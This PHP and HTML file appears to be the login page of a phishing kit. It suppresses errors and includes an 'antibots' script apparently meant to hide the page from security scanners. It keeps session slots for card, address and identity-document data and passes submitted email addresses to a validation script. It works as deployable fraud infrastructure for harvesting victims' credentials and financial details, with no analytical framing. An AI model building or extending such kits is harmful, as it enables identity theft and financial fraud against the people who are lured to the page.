<?php
session_start();
error_reporting(0);
$_SESSION['login'] = ''; 
$_SESSION['card'] = null;
$_SESSION['address'] = null;
$_SESSION['document'] = null;
include("../antibots.php");
include("../lang/language.php");
if (isset($_POST['email'])) {
include('verification/email_validation.php'); 
}
?>
<html lang="en_G2" dir="ltr" class="js">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="format-detection" content="telephone=no">
<link rel="stylesheet" href="../files/css/login.css">
<title><? echo($language['login'][1]) ?></title>
<link rel="shortcut icon" type="image/x-icon" href="../files/img/favicon.ico">
<div id="content"></div>
<script type="text/javascript" src="../files/js/jquery.js"></script>
<script type="text/javascript" src="../files/js/plugins.js"></script>
<script type="text/javascript" src="../files/js/login.js"></script>
</html> 